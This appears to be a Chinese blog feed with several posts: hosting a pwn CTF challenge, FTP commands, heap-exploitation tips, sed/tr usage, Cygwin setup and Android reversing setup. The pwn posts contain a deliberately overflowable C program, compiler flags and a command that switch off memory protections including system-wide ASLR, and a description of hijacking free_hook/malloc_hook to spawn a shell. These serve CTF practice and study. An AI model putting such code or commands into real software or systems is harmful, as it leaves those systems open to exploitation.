      <content type="html"><![CDATA[<p>其实最近做题有一些感触，觉得在自己服务器上搭建题目可能比较关键，常见的需要搭建的题目大概分为三大类：crypto、pwn、web。web搭建比较复杂，运维也很困难，有时候权限问题就会让运维着痛不欲生，而且一般来说做题的时候不太可能会拿到赛题；crypto有些赛题会给出一些代码，然后可以在内部运行，但也有可能不给代码，让你自己琢磨，这些都得靠你自己的思路；pwn题一般会给源码或者可执行文件，所以可以编译之后进行运行。所以本文只讲pwn题的搭建。大家可以触类旁通，搞清楚crypto题的搭建。</p>
<h3 id="1-pwn题搭建"><a href="#1-pwn题搭建" class="headerlink" title="1. pwn题搭建"></a>1. pwn题搭建</h3><h4 id="1-1-准备题目"><a href="#1-1-准备题目" class="headerlink" title="1.1 准备题目"></a>1.1 准备题目</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> buffer[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOLBF, <span class="number">0</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Do your kown what is it : [%p] ?\n"</span>, buffer);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Now give me your answer : \n"</span>);</div><div class="line">    read(<span class="number">0</span>, buffer, <span class="number">0x40</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="1-2-GCC-G-编译"><a href="#1-2-GCC-G-编译" class="headerlink" title="1.2 GCC/G++编译"></a>1.2 GCC/G++编译</h4><p>命令参数</p>
<p>1.关掉DEP/NX（堆栈不可执行）</p>
<blockquote>
<p>gcc  -z execstack -o level level.c</p>
</blockquote>
<p>2.关掉Stack Protector/Canary（栈保护）</p>
<blockquote>
<p>gcc -fno-stack-protector -o level level.c</p>
</blockquote>
<p>3.关掉程序ASLR/PIE（程序随机化保护）</p>
<blockquote>
<p>gcc -no-pie level level.c</p>
</blockquote>
<p>4.关闭整个linux系统的ASLR保护</p>
<blockquote>
<p>sudo -s<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>exit</p>
</blockquote>
<p>5.打开整个linux系统的ASLR保护</p>
<blockquote>
<p>sudo -s<br>echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
</blockquote>
<p>6.64位linux下面的GCC编译出一个32位可执行程序</p>
<blockquote>
<p> 加参数- m32</p>
<p>gcc -m32 -z execstack -fno-stack-protector -o level level.c</p>
</blockquote>
<h4 id="1-3-挂载题目"><a href="#1-3-挂载题目" class="headerlink" title="1.3 挂载题目"></a>1.3 挂载题目</h4><p>1.使用socat挂载在服务器端口</p>
<blockquote>
<p>sudo apt-get install socat<br>socat tcp-l:端口号,fork exec:程序位置,reuseaddr</p>
</blockquote>
<p>2.nohup命令（使得关闭终端也能运行题目程序）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">First.编写脚本pwn.sh</div><div class="line"></div><div class="line">#!/bin/sh</div><div class="line">#name:pwn.sh</div><div class="line">socat tcp-l:端口号，fork exec:程序位置，reuseaddr</div><div class="line"></div><div class="line">Next.运行脚本</div><div class="line"></div><div class="line">sudo chmod u+x ./pwn.sh</div><div class="line">nohup ./pwn.sh &amp;</div></pre></td></tr></table></figure>
<h4 id="1-4-访问"><a href="#1-4-访问" class="headerlink" title="1.4 访问"></a>1.4 访问</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc IP地址 端口号</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ftp命令的使用方法]]></title>
      <url>/2018/03/20/ftp%E5%91%BD%E4%BB%A4%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>ftp服务器在网上较为常见，Linux/windows ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux/Windows ftp命令的一些经常使用的命令，相信掌握了这些使用Linux/Windows 进行ftp操作将会非常容易。</p>
<h3 id="ftp命令的一般格式"><a href="#ftp命令的一般格式" class="headerlink" title="ftp命令的一般格式"></a>ftp命令的一般格式</h3><p><code>$ ftp 主机名/IP</code></p>
<p>其中“主机名/IP”是所要连接的远程机的主机名或IP地址。在命令行中，主机名属于选项，如果指定主机名，ftp将试图与远程机的ftp服务程序进行连接；如果没有指定主机名，ftp将给出提示符，等待用户输入命令：<br><code>$ ftp</code><br><code>ftp &gt;</code><br>此时在ftp&gt;提示符后面输入open命令加主机名或IP地址，将试图连接指定的主机。<br>不管使用哪一种方法，如果连接成功，需要在远程机上登录。用户如果在远程机上有帐号，就可以通过ftp使用这一帐号并需要提供口令。在远程机上的用户帐号的读写权限决定该用户在远程机上能下载什么文件和将上载文件放到哪个目录中。<br>如果没有远程机的专用登录帐号，许多ftp站点设有可以使用的特殊帐号。这个帐号的登录名为anonymous（也称为匿名ftp），当使用这一帐号时，要求输入email地址作为口令。<br>如果远程系统提供匿名ftp服务，用户使用这项服务可以登录到特殊的，供公开使用的目录。一般专门提供两个目录：pub目录和incoming目录。pub目录包含该站点供公众使用的所有文件，incoming目录存放上载到该站点的文件。<br>一旦用户使用ftp在远程站点上登录成功，将得到“ftp&gt;”提示符。现在可以自由使用ftp提供的命令，可以用 help命令取得可供使用的命令清单，也可以在 help命令后面指定具体的命令名称，获得这条命令的说明。</p>
<h3 id="最常用的命令有"><a href="#最常用的命令有" class="headerlink" title="最常用的命令有"></a>最常用的命令有</h3><p>ls 列出远程机的当前目录<br>cd 在远程机上改变工作目录<br>lcd 在本地机上改变工作目录<br>ascii 设置文件传输方式为ASCII模式<br>binary 设置文件传输方式为二进制模式<br>close 终止当前的ftp会话<br>hash 每次传输完数据缓冲区中的数据后就显示一个#号<br>get（mget） 从远程机传送指定文件到本地机<br>put（mput） 从本地机传送指定文件到远程机<br>open 连接远程ftp站点<br>断开与远程机的连接并退出ftp<br>? 显示本地帮助信息<br>! 转到Shell中</p>
<h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a>其它命令</h3><p>◆启动ftp会话<br>open命令用于打开一个与远程主机的会话。该命令的一般格式是：<br>◆open 主机名/IP<br>如果在ftp 会话期间要与一个以上的站点连接，通常只用不带参数的ftp命令。如果在会话期间只想与一台计算机连接，那么在命令行上指定远程主机名或IP地址作为ftp命令的参数。<br>◆终止ftp会话<br>close、disconnect、和bye命令用于终止与远程机的会话。close和disronnect命令关闭与远程机的连接，但是使用户留在本地计算机的ftp程序中。和bye命令都关闭用户与远程机的连接，然后退出用户机上的ftp 程序。<br>◆改变目录<br>“cd [目录]”命令用于在ftp会话期间改变远程机上的目录，lcd命令改变本地目录，使用户能指定查找或放置本地文件的位置。<br>◆远程目录列表<br>ls命令列出远程目录的内容，就像使用一个交互shell中的ls命令一样。ls命令的一般格式是：<br>ls [目录][本地文件]<br>如果指定了目录作为参数，那么ls就列出该目录的内容。如果给出一个本地文件的名字，那么这个目录列表被放入本地机上您指定的这个文件中。<br>◆从远程系统获取文件<br>get和mget命令用于从远程机上获取文件。get命令的一般格式为：<br>get 文件名<br>您还可以给出本地文件名，这个文件名是这个要获取的文件在您的本地机上创建时的文件名。如果您不给出一个本地文件名，那么就使用远程文件原来的名字。<br>mget命令一次获取多个远程文件。mget命令的一般格式为：<br>mget 文件名列表<br>使用用空格分隔的或带通配符的文件名列表来指定要获取的文件，对其中的每个文件都要求用户确认是否传送。<br>◆向远程系统发送文件<br>put和mput命令用于向远程机发送文件。Put命令的一般格式为：<br>put 文件名<br>mput命令一次发送多个本地文件，mput命令的一般格式为：<br>mput 文件名列表<br>使用用空格分隔的或带通配符的文件名列表来指定要发送的文件。对其中的每个文件都要求用户确认是否发送。<br>◆改变文件传输模式<br>默认情况下，ftp按ASCII模式传输文件，用户也可以指定其他模式。ascii和brinary命令的功能是设置传输的模式。用ASCII模式传输文件对纯文本是非常好的，但为避免对二进制文件的破坏，用户可以以二进制模式传输文件。<br>◆检查传输状态<br>传输大型文件时，可能会发现让ftp提供关于传输情况的反馈信息是非常有用的。hash命令使ftp在每次传输完数据缓冲区中的数据后，就在屏幕上打印一个#字符。本命令在发送和接收文件时都可以使用。<br>◆ftp中的本地命令<br>当您使用ftp时，字符“!”用于向本地机上的命令shell传送一个命令。如果用户处在ftp会话中，需要shell做某些事，就很有用。例如用户要建立一个目录来保存接收到的文件。如果输入!mkdir new_dir，那么Linux就在用户当前的本地目录中创建一个名为new_dir 的目录。</p>
<p>这里Linux ftp命令就介绍到这里，应该足够在Linux系统下使用ftp工具了。</p>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ftp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn的新姿势]]></title>
      <url>/2018/03/16/pwn%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/</url>
      <content type="html"><![CDATA[<h3 id="1-调用malloc的其它常见函数"><a href="#1-调用malloc的其它常见函数" class="headerlink" title="1. 调用malloc的其它常见函数"></a>1. 调用malloc的其它常见函数</h3><ul>
<li>没有setbuf(stdin,0)的时候，scanf也会malloc个堆作为缓冲区。</li>
<li>没有setbuf(stdout,0)的时候，printf才会调用malloc用来在堆上分配缓冲区。</li>
</ul>
<p><a href="https://paper.seebug.org/450/" target="_blank" rel="external">https://paper.seebug.org/450/</a></p>
<h3 id="2-read函数读入指定长度的数据"><a href="#2-read函数读入指定长度的数据" class="headerlink" title="2. read函数读入指定长度的数据"></a>2. read函数读入指定长度的数据</h3><p>当做pwn题时，经常会遇到read一个长度，但是此时输入长度不够，导致其读入了后续操作的字符串，于是给程序调试带来大量的麻烦！</p>
<p>解决办法：在每个read函数处后面都加入time.sleep(1~2)，这相当于时间中断！</p>
<p>另外需要知道的是，scanf其实会产生输入中断。如果前面是read函数，那么此处的scanf函数将会对读入进行中断！</p>
<h3 id="3-free-hook和malloc-hook"><a href="#3-free-hook和malloc-hook" class="headerlink" title="3. free_hook和malloc_hook"></a>3. free_hook和malloc_hook</h3><p>其实从名字就可以看出，free_hook是free函数调用时的钩子函数，malloc_hook是malloc函数调用时的钩子函数。如果能够改变free_hook或者malloc_hook为system地址，并布置好其参数“/bin/sh\0”，那么在调用free或者malloc函数，将会执行system(&quot;/bin/sh&quot;)</p>
<p>那么使用其的场景是什么呢？</p>
<p>一般是用户有fastbin attack任意地址写，但是找不到对应大小的可用bin块，这时候会选择使用stderr或者stdout或者stdin其地址高位的0x7f，从而在libc中不断使用任意地址写，直到可以改写free_hook或者malloc_hook。</p>
<p>比较经典的是2018_qwb的那道raisepig题！</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux中常见指令解释]]></title>
      <url>/2018/03/13/linux%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%A7%A3%E9%87%8A/</url>
      <content type="html"><![CDATA[<h3 id="1-sed"><a href="#1-sed" class="headerlink" title="1. sed"></a>1. sed</h3><p>sed是一个经常被忽视的指令，但是sed使用范围十分广阔，这里介绍其几个简单的使用方法</p>
<p><strong>语法：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</div></pre></td></tr></table></figure>
<p><strong>参数说明：</strong></p>
<ul>
<li>-e\&lt;script>或--expression=\&lt;script> 以选项中指定的script来处理输入的文本文件。</li>
<li>-f\&lt;script文件>或--file=\&lt;script文件> 以选项中指定的script文件来处理输入的文本文件。</li>
<li>-h或--help 显示帮助。</li>
<li>-n或--quiet或--silent 仅显示script处理后的结果。</li>
<li>-V或--version 显示版本信息。</li>
</ul>
<p><strong>动作说明：</strong></p>
<ul>
<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li>
<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
<li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li>
<li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法</li>
</ul>
<p><strong>范例：</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！</span></div><div class="line">[root@www ~]# nl /etc/passwd | sed '2,5d'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash">　在第二行后(亦即是加在第三行)加上『drink tea?』字样</span></div><div class="line">[root@www ~]# nl /etc/passwd | sed '2a drink tea'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">2 bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">drink tea</div><div class="line">3 daemon:x:2:2:daemon:/sbin:/sbin/nologin</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> 在第二行前</span></div><div class="line">[root@www ~]# nl /etc/passwd | sed '2i drink tea'</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> 要增加两行以上（在第二行后面加入两行字）</span></div><div class="line">[root@www ~]# nl /etc/passwd | sed '2a Drink tea or ......\</div><div class="line"><span class="meta">&gt;</span><span class="bash"> drink beer ?<span class="string">'</span></span></div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">2 bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">Drink tea or ......</div><div class="line">drink beer ?</div><div class="line">3 daemon:x:2:2:daemon:/sbin:/sbin/nologin</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string">　将第2-5行的内容取代成为『No 2-5 number』</span></span></div><div class="line">[root@www ~]# nl /etc/passwd | sed '2,5c No 2-5 number'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">No 2-5 number</div><div class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 仅列出 /etc/passwd 文件内的第 5-7 行</span></span></div><div class="line">[root@www ~]# nl /etc/passwd | sed -n '5,7p'</div><div class="line">5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</div><div class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 搜索 /etc/passwd有root关键字的行(所有)</span></span></div><div class="line">[root@www ~]# nl /etc/passwd | sed '/root/p'</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 使用-n的时候将只打印包含模板的行</span></span></div><div class="line">nl /etc/passwd | sed -n '/root/p'</div><div class="line">1  root:x:0:0:root:/root:/bin/bash</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 数据的搜寻并删除</span></span></div><div class="line">nl /etc/passwd | sed  '/root/d'</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 数据的搜寻并执行命令。执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行</span></span></div><div class="line">nl /etc/passwd | sed -n '/bash/&#123;s/bash/blueshell/;p;q&#125;'    </div><div class="line">1  root:x:0:0:root:/root:/bin/blueshell</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 数据的搜寻并替换</span></span></div><div class="line">sed 's/要被取代的字串/新的字串/g'</div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"><span class="string"> 多点编辑</span></span></div><div class="line">nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/'</div><div class="line">1  root:x:0:0:root:/root:/bin/blueshell</div><div class="line">2  daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div></pre></td></tr></table></figure>
<h3 id="2-tr"><a href="#2-tr" class="headerlink" title="2. tr"></a>2. tr</h3><p><strong>语法</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tr [-cdst][--help][--version][第一字符集][第二字符集]  </div><div class="line">tr [OPTION]…SET1[SET2]</div></pre></td></tr></table></figure>
<p><strong>参数说明</strong></p>
<ul>
<li>-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换</li>
<li>-d, --delete：删除指令字符</li>
<li>-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</li>
<li>-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</li>
</ul>
<p><strong>字符集</strong></p>
<ul>
<li>\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</li>
<li>\ 反斜杠</li>
<li>\a Ctrl-G 铃声</li>
<li>\b Ctrl-H 退格符</li>
<li>\f Ctrl-L 走行换页</li>
<li>\n Ctrl-J 新行</li>
<li>\r Ctrl-M 回车</li>
<li>\t Ctrl-I tab键</li>
<li>\v Ctrl-X 水平制表符</li>
<li>CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</li>
<li>[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</li>
<li>[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</li>
<li>[:alnum:] ：所有字母字符与数字</li>
<li>[:alpha:] ：所有字母字符</li>
<li>[:blank:] ：所有水平空格</li>
<li>[:cntrl:] ：所有控制字符</li>
<li>[:digit:] ：所有数字</li>
<li>[\:graph\:] ：所有可打印的字符(不包含空格符)</li>
<li>[:lower:] ：所有小写字母</li>
<li>[:print:] ：所有可打印的字符(包含空格符)</li>
<li>[:punct:] ：所有标点字符</li>
<li>[:space:] ：所有水平与垂直空格符</li>
<li>[:upper:] ：所有大写字母</li>
<li>[:xdigit:] ：所有 16 进位制的数字</li>
<li>[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cygwin常见配置]]></title>
      <url>/2018/03/12/cygwin%E5%B8%B8%E8%A7%81%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<p>cygwin作为windows下轻便快捷的linux系统，一直深受用户喜爱！当然，现在不少同学也喜欢用xshell连接虚拟机，这样也挺方便的。唯一的不足就是，开启虚拟机需要耗费不小的内存、cpu，这样会影响性能。所以若有替代虚拟机的办法，我尽量会使用替代方式。</p>
<h3 id="1-cygwin初始安装须知"><a href="#1-cygwin初始安装须知" class="headerlink" title="1. cygwin初始安装须知"></a>1. cygwin初始安装须知</h3><p>cygwin安装时需要安装一系列初始包，太多初始包会使安装时间过长、安装不稳定，故而经常性导致出错导致重新安装，这样十分浪费时间。所以初始安装包时，尽量只安装必要的软件。</p>
<ul>
<li>vi、vim、curl、wget、tar、gawk、bzip2、git等</li>
</ul>
<h3 id="2-cygwin包管理软件apt-cyg"><a href="#2-cygwin包管理软件apt-cyg" class="headerlink" title="2. cygwin包管理软件apt-cyg"></a>2. cygwin包管理软件apt-cyg</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/transcode-open/apt-cyg.git</div><div class="line">cd apt-cyg</div><div class="line">cp apt-cyg /bin/</div><div class="line">chmod +x /bin/apt-cyg</div></pre></td></tr></table></figure>
<p>之后安装，都类似于apt-get</p>
<p>我的源地址： <a href="http://mirror.rit.edu/cygwin/" target="_blank" rel="external">http://mirror.rit.edu/cygwin/</a></p>
<p>换源：找到/etc/setup/setup.rc中最后几行，将last-mirror中的源换掉</p>
<h3 id="3-必要的安装环节"><a href="#3-必要的安装环节" class="headerlink" title="3. 必要的安装环节"></a>3. 必要的安装环节</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt-cyg install python2</div><div class="line">apt-cyg install python3</div><div class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</div><div class="line">python get-pip.py</div></pre></td></tr></table></figure>
<p>上面环节安装了python以及pip，但是如何知道使用的pip是不是cygwin中的呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ls /bin/ | grep &quot;pip&quot;  #查找/bin/中存在的pip指令，一般会有pip2、pip3</div><div class="line">which pip   # 查看pip使用的是哪个地址，有时候会使用windows环境下的pip</div></pre></td></tr></table></figure>
<p>我的环境中只能使用pip2，使用pip时会直接调用windows下的pip指令，导致下载的内容没用放到cygwin中，也即下载之后根本不能用。</p>
<h3 id="4-pip2下载pillow时遇到的问题"><a href="#4-pip2下载pillow时遇到的问题" class="headerlink" title="4. pip2下载pillow时遇到的问题"></a>4. pip2下载pillow时遇到的问题</h3><p>下载pillow时会提示如下的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can&apos;t find lcms2.pc in any of /usr/local/lib/pkgconfig /usr/local/share/pkgconfig /usr/lib/pkgconfig /usr/share/pkgconfig use the PKG_CONFIG_PATH environment variable, or specify extra search paths via &apos;search_paths&apos;</div></pre></td></tr></table></figure>
<p>总共有以下的文件没被找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lcms2.pc</div><div class="line">libtiff-5.pc</div><div class="line">libtiff-4.pc</div><div class="line">freetype2.pc</div><div class="line">libimagequant.pc</div><div class="line">libjpeg.pc</div><div class="line">libopenjp2.pc</div><div class="line">zlib.pc</div><div class="line">Python.h</div></pre></td></tr></table></figure>
<p>这时使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">apt-cyg install libglib2.0-devel</div><div class="line">apt-cyg install liblcms2-devel</div><div class="line">apt-cyg install libtiff-devel</div><div class="line">apt-cyg install libjpeg-devel</div><div class="line">apt-cyg install libimagequant-devel</div><div class="line">apt-cyg install libopenjp2-devel</div><div class="line">apt-cyg install python2-devel</div></pre></td></tr></table></figure>
<p>之后仍未找到Python.h，这是因为全局变量PATH没有修正：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">find / -name &quot;Python.h&quot;  # 找到Python.h对应的位置</div><div class="line">PATH=$PATH:Python.h所在文件夹</div></pre></td></tr></table></figure>
<p>最后发现是gcc使用的window中的gcc，而不是cygwin中的gcc（其实没装）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-cyg install gcc-core</div><div class="line">apt-cyg install gcc-g++</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> tool </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cygwin </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[android逆向准备工作]]></title>
      <url>/2018/02/08/android%E9%80%86%E5%90%91%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/</url>
      <content type="html"><![CDATA[<h3 id="0、笔者自述"><a href="#0、笔者自述" class="headerlink" title="0、笔者自述"></a>0、笔者自述</h3><p>说实话，对于Android逆向，我还只处在开始调试开发的阶段，但是实在是受不了Android中的流氓软件以及流氓事件，我打算进行简单的安卓逆向。刚开始的目标是去除app中的广告页（现在发现十分困难）！</p>
<h3 id="1、安卓逆向的环境安装"><a href="#1、安卓逆向的环境安装" class="headerlink" title="1、安卓逆向的环境安装"></a>1、安卓逆向的环境安装</h3><h4 id="1-1-jdk安装"><a href="#1-1-jdk安装" class="headerlink" title="1.1 jdk安装"></a>1.1 jdk安装</h4><p>jdk安装实在指导很多，但是这儿还是得提醒一句，是jdk的安装，不是jre！</p>
<p>参考：<a href="https://jingyan.baidu.com/article/0202781175839b1bcc9ce529.html" target="_blank" rel="external">https://jingyan.baidu.com/article/0202781175839b1bcc9ce529.html</a></p>
<h4 id="1-2-Android-Studio安装"><a href="#1-2-Android-Studio安装" class="headerlink" title="1.2 Android Studio安装"></a>1.2 Android Studio安装</h4><p>貌似现在很多的书籍和网上的提示都是建议用ADT，也即安装Eclipse之后再安装ADT bundle（包含SDK），这中间配置极其麻烦，并且网上很多指导建议都已经过时，毕竟Google已经取消对ADT的支持，只推荐使用Android Studio。如果你们还不死心，那你除了安装上述内容外，还需要安装原生开发包（NDK）。</p>
<p>但是如果你安装Android Studio，这些内容都可以快速配置完毕！其包含SDK_Manager、AVD_Manager等工具。</p>
<h4 id="1-3-模拟器的使用"><a href="#1-3-模拟器的使用" class="headerlink" title="1.3 模拟器的使用"></a>1.3 模拟器的使用</h4><p>其实我很早就使用Android Studio了，在对比了1.0和现在的3.0版本之后，我发现Android Studio最大的改进就是加快了模拟器的启动速度。这应该会让许许多多的开发者爱上原生态的开发编辑器。现在使用的模拟器最大的问题在于，“窗口标题栏”不见了，没法进行拖拽，没法直接关闭，我真的要疯了！</p>
<p>所以我在网上搜了好多，最后决定使用Genymotion和夜神模拟器！</p>
<h5 id="1-3-1-Genymotion的安装与配置"><a href="#1-3-1-Genymotion的安装与配置" class="headerlink" title="1.3.1 Genymotion的安装与配置"></a>1.3.1 Genymotion的安装与配置</h5><p>Genymotion支持多种版本的手机，所以比较适用于开发。但是，它并不值得夸奖。</p>
<p>不知道你们在安装Genymotion的时候，是否会出现登录错误、下载贼慢等稀奇古怪的问题，这些问题曾耽搁了我半天的时间。当然，最让人头疼的问题是：</p>
<p><strong>问题a：</strong>Genymotion基于Virtualbox平台，但是从Genymotion中启动模拟器时出现了&quot;Unable to start the Virtual Device...&quot;错误，最后我锁定的问题是virtualbox版本不太稳定，换了一个，重启了电脑；</p>
<p><strong>问题b：</strong>我成功的启动了Genymotion中的模拟器，但是我随便拖个应用进去都安装不上，提示“An error occured while deploying the file. This probably means that the app contains ARM native code and your Genymotion device cannot run ARM instructions. You should either build your native code to x86 or install an ARM translation tool in your device. ”错误，其实这是因为没有<a href="/others/files/Genymotion-ARM-Translation.zip">Genymotion-ARM-Translation.zip</a> 。这就需要我们打开模拟器，将此zip文件拖入模拟器中，一直点击yes，最后就可用了。</p>
<p><strong>问题c：</strong> 虽然有些应用已经可以在Genymotion的模拟器中运行了，但是还是有不少应用运行不了，如微信、知乎等。网上有说换个低版本sdk的模拟器就可以，实测了几个，还是会有这类问题。比较玄学，没法做答！</p>
